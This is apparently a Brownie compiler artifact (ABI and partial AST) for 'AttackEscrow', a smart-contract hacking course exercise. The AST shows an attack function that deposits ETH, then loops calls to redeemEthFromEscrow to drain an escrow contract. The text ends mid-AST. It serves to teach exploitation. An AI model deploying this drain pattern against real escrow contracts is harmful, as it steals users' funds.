{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_nft",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_escrow",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "allSourcePaths": {
    "0": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/access/Ownable.sol",
    "22": "contracts/unchecked-returns-2/AttackEscrow.sol",
    "5": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC721/IERC721.sol",
    "7": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/Context.sol",
    "8": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/introspection/IERC165.sol"
  },
  "ast": {
    "absolutePath": "contracts/unchecked-returns-2/AttackEscrow.sol",
    "exportedSymbols": {
      "AttackEscrow": [
        2180
      ],
      "Context": [
        4596
      ],
      "IERC165": [
        4633
      ],
      "IERC721": [
        4574
      ],
      "IEscrow": [
        2074
      ],
      "IEscrowNFT": [
        2061
      ],
      "Ownable": [
        3128
      ]
    },
    "id": 2181,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 2042,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".13"
        ],
        "nodeType": "PragmaDirective",
        "src": "116:24:22"
      },
      {
        "absolutePath": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/access/Ownable.sol",
        "file": "@openzeppelin/contracts/access/Ownable.sol",
        "id": 2043,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 2181,
        "sourceUnit": 3129,
        "src": "142:52:22",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC721/IERC721.sol",
        "file": "@openzeppelin/contracts/token/ERC721/IERC721.sol",
        "id": 2044,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 2181,
        "sourceUnit": 4575,
        "src": "195:58:22",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [
          {
            "baseName": {
              "id": 2045,
              "name": "IERC721",
              "nameLocations": [
                "279:7:22"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 4574,
              "src": "279:7:22"
            },
            "id": 2046,
            "nodeType": "InheritanceSpecifier",
            "src": "279:7:22"
          }
        ],
        "canonicalName": "IEscrowNFT",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 2061,
        "linearizedBaseContracts": [
          2061,
          4574,
          4633
        ],
        "name": "IEscrowNFT",
        "nameLocation": "265:10:22",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "fc314e31",
            "id": 2055,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "tokenDetails",
            "nameLocation": "302:12:22",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2049,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 2048,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 2055,
                  "src": "315:7:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 2047,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "315:7:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "314:9:22"
            },
            "returnParameters": {
              "id": 2054,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 2051,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 2055,
                  "src": "347:7:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 2050,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "347:7:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 2053,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 2055,
                  "src": "356:7:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 2052,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "356:7:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "346:18:22"
            },
            "scope": 2061,
            "src": "293:72:22",
            "stateMutability": "view",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "d082e381",
            "id": 2060,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "tokenCounter",
            "nameLocation": "379:12:22",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2056,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "391:2:22"
            },
            "returnParameters": {
              "id": 2059,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 2058,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 2060,
                  "src": "411:7:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 2057,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "411:7:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "410:9:22"
            },
            "scope": 2061,
            "src": "370:50:22",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 2181,
        "src": "255:167:22",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "IEscrow",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 2074,
        "linearizedBaseContracts": [
          2074
        ],
        "name": "IEscrow",
        "nameLocation": "434:7:22",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "c219afee",
            "id": 2068,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "escrowEth",
            "nameLocation": "457:9:22",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2066,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 2063,
                  "mutability": "mutable",
                  "name": "_recipient",
                  "nameLocation": "475:10:22",
                  "nodeType": "VariableDeclaration",
                  "scope": 2068,
                  "src": "467:18:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 2062,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "467:7:22",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 2065,
                  "mutability": "mutable",
                  "name": "_duration",
                  "nameLocation": "495:9:22",
                  "nodeType": "VariableDeclaration",
                  "scope": 2068,
                  "src": "487:17:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 2064,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "487:7:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "466:39:22"
            },
            "returnParameters": {
              "id": 2067,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "522:0:22"
            },
            "scope": 2074,
            "src": "448:75:22",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "41293f24",
            "id": 2073,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "redeemEthFromEscrow",
            "nameLocation": "537:19:22",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2071,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 2070,
                  "mutability": "mutable",
                  "name": "_tokenId",
                  "nameLocation": "565:8:22",
                  "nodeType": "VariableDeclaration",
                  "scope": 2073,
                  "src": "557:16:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 2069,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "557:7:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "556:18:22"
            },
            "returnParameters": {
              "id": 2072,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "583:0:22"
            },
            "scope": 2074,
            "src": "528:56:22",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 2181,
        "src": "424:162:22",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [
          {
            "baseName": {
              "id": 2076,
              "name": "Ownable",
              "nameLocations": [
                "702:7:22"
              ],
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 3128,
              "src": "702:7:22"
            },
            "id": 2077,
            "nodeType": "InheritanceSpecifier",
            "src": "702:7:22"
          }
        ],
        "canonicalName": "AttackEscrow",
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": {
          "id": 2075,
          "nodeType": "StructuredDocumentation",
          "src": "588:88:22",
          "text": " @title AttackEscrow\n @author JohnnyTime (https://smartcontractshacking.com)"
        },
        "fullyImplemented": true,
        "id": 2180,
        "linearizedBaseContracts": [
          2180,
          3128,
          4596
        ],
        "name": "AttackEscrow",
        "nameLocation": "686:12:22",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 2080,
            "mutability": "immutable",
            "name": "escrow",
            "nameLocation": "743:6:22",
            "nodeType": "VariableDeclaration",
            "scope": 2180,
            "src": "717:32:22",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IEscrow_$2074",
              "typeString": "contract IEscrow"
            },
            "typeName": {
              "id": 2079,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 2078,
                "name": "IEscrow",
                "nameLocations": [
                  "717:7:22"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 2074,
                "src": "717:7:22"
              },
              "referencedDeclaration": 2074,
              "src": "717:7:22",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IEscrow_$2074",
                "typeString": "contract IEscrow"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 2083,
            "mutability": "immutable",
            "name": "nft",
            "nameLocation": "784:3:22",
            "nodeType": "VariableDeclaration",
            "scope": 2180,
            "src": "755:32:22",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IEscrowNFT_$2061",
              "typeString": "contract IEscrowNFT"
            },
            "typeName": {
              "id": 2082,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 2081,
                "name": "IEscrowNFT",
                "nameLocations": [
                  "755:10:22"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 2061,
                "src": "755:10:22"
              },
              "referencedDeclaration": 2061,
              "src": "755:10:22",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IEscrowNFT_$2061",
                "typeString": "contract IEscrowNFT"
              }
            },
            "visibility": "private"
          },
          {
            "body": {
              "id": 2102,
              "nodeType": "Block",
              "src": "837:78:22",
              "statements": [
                {
                  "expression": {
                    "id": 2094,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 2090,
                      "name": "nft",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 2083,
                      "src": "851:3:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IEscrowNFT_$2061",
                        "typeString": "contract IEscrowNFT"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 2092,
                          "name": "_nft",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 2085,
                          "src": "868:4:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 2091,
                        "name": "IEscrowNFT",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 2061,
                        "src": "857:10:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_IEscrowNFT_$2061_$",
                          "typeString": "type(contract IEscrowNFT)"
                        }
                      },
                      "id": 2093,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "857:16:22",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IEscrowNFT_$2061",
                        "typeString": "contract IEscrowNFT"
                      }
                    },
                    "src": "851:22:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IEscrowNFT_$2061",
                      "typeString": "contract IEscrowNFT"
                    }
                  },
                  "id": 2095,
                  "nodeType": "ExpressionStatement",
                  "src": "851:22:22"
                },
                {
                  "expression": {
                    "id": 2100,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 2096,
                      "name": "escrow",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 2080,
                      "src": "883:6:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IEscrow_$2074",
                        "typeString": "contract IEscrow"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 2098,
                          "name": "_escrow",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 2087,
                          "src": "900:7:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 2097,
                        "name": "IEscrow",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 2074,
                        "src": "892:7:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_IEscrow_$2074_$",
                          "typeString": "type(contract IEscrow)"
                        }
                      },
                      "id": 2099,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "892:16:22",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IEscrow_$2074",
                        "typeString": "contract IEscrow"
                      }
                    },
                    "src": "883:25:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IEscrow_$2074",
                      "typeString": "contract IEscrow"
                    }
                  },
                  "id": 2101,
                  "nodeType": "ExpressionStatement",
                  "src": "883:25:22"
                }
              ]
            },
            "id": 2103,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2088,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 2085,
                  "mutability": "mutable",
                  "name": "_nft",
                  "nameLocation": "814:4:22",
                  "nodeType": "VariableDeclaration",
                  "scope": 2103,
                  "src": "806:12:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 2084,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "806:7:22",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 2087,
                  "mutability": "mutable",
                  "name": "_escrow",
                  "nameLocation": "828:7:22",
                  "nodeType": "VariableDeclaration",
                  "scope": 2103,
                  "src": "820:15:22",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 2086,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "820:7:22",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "805:31:22"
            },
            "returnParameters": {
              "id": 2089,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "837:0:22"
            },
            "scope": 2180,
            "src": "794:121:22",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 2174,
              "nodeType": "Block",
              "src": "966:480:22",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 2116,
                            "name": "this",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -28,
                            "src": "1019:4:22",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_AttackEscrow_$2180",
                              "typeString": "contract AttackEscrow"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_AttackEscrow_$2180",
                              "typeString": "contract AttackEscrow"
                            }
                          ],
                          "id": 2115,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "1011:7:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 2114,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "1011:7:22",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 2117,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "1011:13:22",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 2118,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1026:1:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          },
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "expression": {
                          "id": 2108,
                          "name": "escrow",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 2080,
                          "src": "976:6:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IEscrow_$2074",
                            "typeString": "contract IEscrow"
                          }
                        },
                        "id": 2110,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "983:9:22",
                        "memberName": "escrowEth",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 2068,
                        "src": "976:16:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$_t_address_$_t_uint256_$returns$__$",
                          "typeString": "function (address,uint256) payable external"
                        }
                      },
                      "id": 2113,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "expression": {
                            "id": 2111,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1000:3:22",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 2112,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "1004:5:22",
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "1000:9:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "976:34:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$_t_address_$_t_uint256_$returns$__$value",
                        "typeString": "function (address,uint256) payable external"
                      }
                    },
                    "id": 2119,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "976:52:22",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 2120,
                  "nodeType": "ExpressionStatement",
                  "src": "976:52:22"
                },
                {
                  "assignments": [
                    2122
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 2122,
                      "mutability": "mutable",
                      "name": "tokenId",
                      "nameLocation": "1047:7:22",
                      "nodeType": "VariableDeclaration",
                      "scope": 2174,
                      "src": "1039:15:22",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 2121,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1039:7:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 2126,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 2123,
                        "name": "nft",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 2083,
                        "src": "1057:3:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IEscrowNFT_$2061",
                          "typeString": "contract IEscrowNFT"
                        }
                      },
                      "id": 2124,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "1061:12:22",
                      "memberName": "tokenCounter",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 2060,
                      "src": "1057:16:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$_t_uint256_$",
                        "typeString": "function () external returns (uint256)"
                      }
                    },
                    "id": 2125,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1057:18:22",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1039:36:22"
                },
                {
                  "assignments": [
                    2128
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 2128,
                      "mutability": "mutable",
                      "name": "escrowETHBalance",
                      "nameLocation": "1093:16:22",
                      "nodeType": "VariableDeclaration",
                      "scope": 2174,
                      "src": "1085:24:22",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 2127,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1085:7:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 2134,
                  "initialValue": {
                    "expression": {
                      "arguments": [
                        {
                          "id": 2131,
                          "name": "escrow",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 2080,
                          "src": "1120:6:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IEscrow_$2074",
                            "typeString": "contract IEscrow"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_contract$_IEscrow_$2074",
                            "typeString": "contract IEscrow"
                          }
                        ],
                        "id": 2130,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "1112:7:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 2129,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "1112:7:22",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 2132,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1112:15:22",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "id": 2133,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "memberLocation": "1128:7:22",
                    "memberName": "balance",
                    "nodeType": "MemberAccess",
                    "src": "1112:23:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1085:50:22"
                },
                {
                  "body": {
                    "id": 2153,
                    "nodeType": "Block",
                    "src": "1183:116:22",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 2142,
                              "name": "tokenId",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 2122,
                              "src": "1224:7:22",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            ],
                            "expression": {
                              "id": 2139,
                              "name": "escrow",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 2080,
                              "src": "1197:6:22",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IEscrow_$2074",
                                "typeString": "contract IEscrow"
                              }
                            },
                            "id": 2141,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "1204:19:22",
                            "memberName": "redeemEthFromEscrow",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 2073,
                            "src": "1197:26:22",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                              "typeString": "function (uint256) external"
                            }
                          },
                          "id": 2143,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1197:35:22",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
